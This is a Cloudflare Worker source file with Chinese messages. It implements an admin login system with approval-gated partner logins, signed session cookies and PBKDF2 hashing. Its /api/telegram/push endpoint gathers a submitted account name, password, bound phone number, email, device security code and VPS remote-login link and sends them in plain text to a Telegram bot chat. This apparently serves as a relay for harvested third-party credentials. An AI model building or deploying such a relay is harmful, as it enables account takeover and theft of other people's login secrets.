const SESSION_COOKIE = 'gpc_session';
const SESSION_MAX_AGE = 60 * 60 * 12;

export class AuthStore {
  constructor(state, env) {
    this.state = state;
    this.env = env;
  }

  async fetch(request) {
    const url = new URL(request.url);
    await this.ensureSuperAdmin();

    if (url.pathname === '/login' && request.method === 'POST') {
      const body = await readJson(request);
      const username = String(body.username || '').trim();
      const password = String(body.password || '');
      const deviceId = normalizeDeviceId(body.deviceId);
      const user = await this.state.storage.get(`user:${username}`);

      if (!user || user.status !== 'active' || !deviceId) {
        return json({ message: '账号、密码或设备信息错误' }, 401);
      }
      if (!isSupportedPbkdf2Hash(user.passwordHash)) {
        return json({ message: '密码哈希配置不兼容 Cloudflare，请用最新版 npm run hash-secret 重新生成 SUPER_ADMIN_PASSWORD_HASH' }, 503);
      }

      const passwordOk = await verifyPbkdf2(password, user.passwordHash);
      if (!passwordOk) return json({ message: '账号、密码或设备信息错误' }, 401);

      if (user.role === 'super_admin') {
        return json({ ok: true, approved: true, user: publicUser(user), deviceId });
      }

      const requestId = crypto.randomUUID();
      await this.state.storage.put(`login_request:${requestId}`, {
        id: requestId,
        username: user.username,
        role: user.role,
        deviceId,
        status: 'pending',
        createdAt: new Date().toISOString()
      });

      return json({ ok: true, approved: false, requestId, message: '已提交登录申请，等待超级管理员批准' });
    }

    if (url.pathname === '/login-status' && request.method === 'GET') {
      const requestId = url.searchParams.get('request_id') || '';
      const loginRequest = await this.state.storage.get(`login_request:${requestId}`);
      if (!loginRequest) return json({ message: '登录申请不存在或已过期' }, 404);
      if (loginRequest.status !== 'approved') return json({ approved: false, status: loginRequest.status });
      if (loginRequest.consumedAt) return json({ message: '登录申请已使用，请重新登录' }, 409);

      const user = await this.state.storage.get(`user:${loginRequest.username}`);
      if (!user || user.status !== 'active') return json({ message: '账号不可用' }, 403);

      loginRequest.consumedAt = new Date().toISOString();
      await this.state.storage.put(`login_request:${requestId}`, loginRequest);
      return json({ approved: true, user: publicUser(user), deviceId: loginRequest.deviceId });
    }

    if (url.pathname === '/users' && request.method === 'GET') {
      const users = [];
      const entries = await this.state.storage.list({ prefix: 'user:' });
      for (const user of entries.values()) users.push(publicUser(user));
      return json({ users: users.sort((a, b) => a.createdAt.localeCompare(b.createdAt)) });
    }

    if (url.pathname === '/users' && request.method === 'POST') {
      const body = await readJson(request);
      const username = String(body.username || '').trim();
      const password = String(body.password || '');
      const role = body.role === 'super_admin' ? 'super_admin' : 'partner_admin';

      if (!/^[a-zA-Z0-9_@.-]{3,40}$/.test(username)) {
        return json({ message: '账号需为 3-40 位字母、数字或 _ @ . -' }, 400);
      }
      if (password.length < 8) return json({ message: '密码至少 8 位' }, 400);
      if (await this.state.storage.get(`user:${username}`)) return json({ message: '账号已存在' }, 409);

      const user = {
        id: crypto.randomUUID(),
        username,
        role,
        status: 'active',
        passwordHash: await hashPbkdf2(password),
        createdAt: new Date().toISOString()
      };
      await this.state.storage.put(`user:${username}`, user);
      return json({ user: publicUser(user) }, 201);
    }

    if (url.pathname === '/login-requests' && request.method === 'GET') {
      const requests = [];
      const entries = await this.state.storage.list({ prefix: 'login_request:' });
      for (const loginRequest of entries.values()) requests.push(loginRequest);
      requests.sort((a, b) => b.createdAt.localeCompare(a.createdAt));
      return json({ requests: requests.slice(0, 30) });
    }

    const approveMatch = url.pathname.match(/^\/login-requests\/([^/]+)\/approve$/);
    if (approveMatch && request.method === 'POST') {
      const requestId = approveMatch[1];
      const loginRequest = await this.state.storage.get(`login_request:${requestId}`);
      if (!loginRequest) return json({ message: '登录申请不存在' }, 404);
      loginRequest.status = 'approved';
      loginRequest.approvedAt = new Date().toISOString();
      await this.state.storage.put(`login_request:${requestId}`, loginRequest);
      return json({ request: loginRequest });
    }

    return json({ message: 'Not found' }, 404);
  }

  async ensureSuperAdmin() {
    const username = this.env.SUPER_ADMIN_USERNAME || this.env.ADMIN_USERNAME || 'admin';
    const passwordHash = this.env.SUPER_ADMIN_PASSWORD_HASH || this.env.ADMIN_PASSWORD_HASH;
    if (!passwordHash) return;
    const existing = await this.state.storage.get(`user:${username}`);
    if (existing) {
      if (existing.role === 'super_admin' && existing.passwordHash !== passwordHash) {
        existing.passwordHash = passwordHash;
        existing.updatedAt = new Date().toISOString();
        await this.state.storage.put(`user:${username}`, existing);
      }
      return;
    }

    await this.state.storage.put(`user:${username}`, {
      id: crypto.randomUUID(),
      username,
      role: 'super_admin',
      status: 'active',
      passwordHash,
      createdAt: new Date().toISOString()
    });
  }
}

export default {
  async fetch(request, env) {
    const url = new URL(request.url);

    if (url.pathname.startsWith('/api/')) {
      return handleApi(request, env, url);
    }

    return env.ASSETS.fetch(request);
  }
};

async function handleApi(request, env, url) {
  if (!env.AUTH_STORE || !env.SESSION_SECRET) {
    return json({ message: '认证后端未配置，请检查 AUTH_STORE 和 SESSION_SECRET' }, 503);
  }

  if (url.pathname === '/api/auth/me' && request.method === 'GET') {
    const session = await readSession(request, env);
    return json({
      authenticated: Boolean(session),
      user: session ? { id: session.userId, username: session.username, role: session.role } : null
    });
  }

  if (url.pathname === '/api/auth/login' && request.method === 'POST') {
    const response = await authStore(env).fetch(new Request('https://auth.local/login', {
      method: 'POST',
      body: await request.text(),
      headers: { 'Content-Type': 'application/json' }
    }));
    const data = await response.json();
    if (!response.ok || !data.approved) return json(data, response.status);

    const token = await signSession({
      userId: data.user.id,
      username: data.user.username,
      role: data.user.role,
      deviceId: data.deviceId,
      exp: nowSeconds() + SESSION_MAX_AGE
    }, env.SESSION_SECRET);

    return json({ ok: true, approved: true, user: data.user }, 200, {
      'Set-Cookie': sessionCookie(token, SESSION_MAX_AGE)
    });
  }

  if (url.pathname === '/api/auth/login-status' && request.method === 'GET') {
    const requestId = url.searchParams.get('request_id') || '';
    const response = await authStore(env).fetch(`https://auth.local/login-status?request_id=${encodeURIComponent(requestId)}`);
    const data = await response.json();
    if (!response.ok || !data.approved) return json(data, response.status);

    const token = await signSession({
      userId: data.user.id,
      username: data.user.username,
      role: data.user.role,
      deviceId: data.deviceId,
      exp: nowSeconds() + SESSION_MAX_AGE
    }, env.SESSION_SECRET);

    return json({ ok: true, approved: true, user: data.user }, 200, {
      'Set-Cookie': sessionCookie(token, SESSION_MAX_AGE)
    });
  }

  if (url.pathname === '/api/auth/logout' && request.method === 'POST') {
    return json({ ok: true }, 200, {
      'Set-Cookie': `${SESSION_COOKIE}=; HttpOnly; Secure; SameSite=Strict; Path=/; Max-Age=0`
    });
  }

  const session = await readSession(request, env);
  if (!session) return json({ message: '登录已过期，请重新登录' }, 401);

  if (url.pathname.startsWith('/api/admin/')) {
    if (session.role !== 'super_admin') return json({ message: '只有超级管理员可以操作' }, 403);

    if (url.pathname === '/api/admin/users') {
      return authStore(env).fetch(new Request('https://auth.local/users', {
        method: request.method,
        body: request.method === 'POST' ? await request.text() : undefined,
        headers: { 'Content-Type': 'application/json' }
      }));
    }

    if (url.pathname === '/api/admin/login-requests') {
      return authStore(env).fetch('https://auth.local/login-requests');
    }

    const approveMatch = url.pathname.match(/^\/api\/admin\/login-requests\/([^/]+)\/approve$/);
    if (approveMatch && request.method === 'POST') {
      return authStore(env).fetch(new Request(`https://auth.local/login-requests/${approveMatch[1]}/approve`, { method: 'POST' }));
    }
  }

  if (url.pathname === '/api/telegram/push' && request.method === 'POST') {
    return pushTelegramMessage(request, env);
  }

  return json({ message: 'Not found' }, 404);
}

async function pushTelegramMessage(request, env) {
  const botToken = env.TELEGRAM_BOT_TOKEN;
  const chatId = env.TELEGRAM_CHAT_ID;
  if (!botToken || !chatId) {
    return json({ message: 'Telegram Bot 未配置，请设置 TELEGRAM_BOT_TOKEN 和 TELEGRAM_CHAT_ID。' }, 503);
  }

  const body = await readJson(request);
  const phone = [body.phoneCode, body.phone].filter(Boolean).join(' ');
  const message = [
    `账号：${cleanLine(body.account)}`,
    `密码：${cleanLine(body.password)}`,
    `绑定手机号：${cleanLine(phone)}`,
    `绑定邮箱：${cleanLine(body.email)}`,
    `设备安全码：${cleanLine(body.securityCode)}`,
    `VPS登录链接：${cleanLine(body.vpsRemoteUrl)}`
  ].join('\n');

  const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: chatId,
      text: message,
      disable_web_page_preview: true
    })
  });

  if (!response.ok) {
    const data = await response.json().catch(() => ({}));
    return json({ message: data.description || 'Telegram 推送失败，请检查 Bot Token 和 Chat ID。' }, 502);
  }

  return json({ ok: true });
}

function authStore(env) {
  return env.AUTH_STORE.get(env.AUTH_STORE.idFromName('global'));
}

function cleanLine(value) {
  return String(value || '').replace(/[\r\n]+/g, ' ').trim();
}

async function readJson(request) {
  try {
    return await request.json();
  } catch {
    return {};
  }
}

function json(payload, status = 200, headers = {}) {
  return new Response(JSON.stringify(payload), {
    status,
    headers: {
      'Content-Type': 'application/json; charset=utf-8',
      'Cache-Control': 'no-store',
      ...headers
    }
  });
}

function normalizeDeviceId(value) {
  const text = String(value || '').trim();
  if (!text || text.length > 128) return '';
  return text;
}

function publicUser(user) {
  return {
    id: user.id,
    username: user.username,
    role: user.role,
    status: user.status,
    createdAt: user.createdAt
  };
}

function nowSeconds() {
  return Math.floor(Date.now() / 1000);
}

function sessionCookie(token, maxAge) {
  return `${SESSION_COOKIE}=${token}; HttpOnly; Secure; SameSite=Strict; Path=/; Max-Age=${maxAge}`;
}

async function readSession(request, env) {
  const token = getCookie(request.headers.get('Cookie') || '', SESSION_COOKIE);
  if (!token || !env.SESSION_SECRET) return null;
  const payload = await verifySession(token, env.SESSION_SECRET);
  if (!payload || payload.exp < nowSeconds()) return null;
  return payload;
}

function getCookie(cookieHeader, name) {
  return cookieHeader
    .split(';')
    .map((item) => item.trim())
    .find((item) => item.startsWith(`${name}=`))
    ?.slice(name.length + 1) || '';
}

async function signSession(payload, secret) {
  const encodedPayload = base64UrlEncode(JSON.stringify(payload));
  const signature = await hmac(`${encodedPayload}`, secret);
  return `${encodedPayload}.${signature}`;
}

async function verifySession(token, secret) {
  const [encodedPayload, signature] = token.split('.');
  if (!encodedPayload || !signature) return null;
  const expected = await hmac(encodedPayload, secret);
  if (!timingSafeEqual(signature, expected)) return null;
  try {
    return JSON.parse(base64UrlDecode(encodedPayload));
  } catch {
    return null;
  }
}

async function hmac(value, secret) {
  const key = await crypto.subtle.importKey(
    'raw',
    new TextEncoder().encode(secret),
    { name: 'HMAC', hash: 'SHA-256' },
    false,
    ['sign']
  );
  const signature = await crypto.subtle.sign('HMAC', key, new TextEncoder().encode(value));
  return base64UrlEncodeBytes(new Uint8Array(signature));
}

async function hashPbkdf2(password) {
  const iterations = 100000;
  const salt = base64UrlEncodeBytes(crypto.getRandomValues(new Uint8Array(16)));
  const key = await crypto.subtle.importKey(
    'raw',
    new TextEncoder().encode(password),
    'PBKDF2',
    false,
    ['deriveBits']
  );
  const bits = await crypto.subtle.deriveBits(
    {
      name: 'PBKDF2',
      hash: 'SHA-256',
      salt: new TextEncoder().encode(salt),
      iterations
    },
    key,
    256
  );
  return `pbkdf2_sha256$${iterations}$${salt}$${base64UrlEncodeBytes(new Uint8Array(bits))}`;
}

async function verifyPbkdf2(password, storedHash) {
  const parts = storedHash.split('$');
  if (parts.length !== 4 || parts[0] !== 'pbkdf2_sha256') return false;
  const iterations = Number(parts[1]);
  const salt = parts[2];
  const expectedHash = parts[3];
  if (!Number.isFinite(iterations) || iterations < 100000 || iterations > 100000 || !salt || !expectedHash) return false;

  const key = await crypto.subtle.importKey(
    'raw',
    new TextEncoder().encode(password),
    'PBKDF2',
    false,
    ['deriveBits']
  );
  const bits = await crypto.subtle.deriveBits(
    {
      name: 'PBKDF2',
      hash: 'SHA-256',
      salt: new TextEncoder().encode(salt),
      iterations
    },
    key,
    256
  );
  return timingSafeEqual(base64UrlEncodeBytes(new Uint8Array(bits)), expectedHash);
}

function isSupportedPbkdf2Hash(storedHash) {
  const parts = String(storedHash || '').split('$');
  if (parts.length !== 4 || parts[0] !== 'pbkdf2_sha256') return false;
  const iterations = Number(parts[1]);
  return Number.isFinite(iterations) && iterations === 100000;
}

function timingSafeEqual(a, b) {
  if (a.length !== b.length) return false;
  let result = 0;
  for (let index = 0; index < a.length; index += 1) {
    result |= a.charCodeAt(index) ^ b.charCodeAt(index);
  }
  return result === 0;
}

function base64UrlEncode(value) {
  return base64UrlEncodeBytes(new TextEncoder().encode(value));
}

function base64UrlEncodeBytes(bytes) {
  let binary = '';
  for (const byte of bytes) binary += String.fromCharCode(byte);
  return btoa(binary).replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/g, '');
}

function base64UrlDecode(value) {
  const padded = value.replace(/-/g, '+').replace(/_/g, '/') + '='.repeat((4 - value.length % 4) % 4);
  const binary = atob(padded);
  const bytes = Uint8Array.from(binary, (char) => char.charCodeAt(0));
  return new TextDecoder().decode(bytes);
}
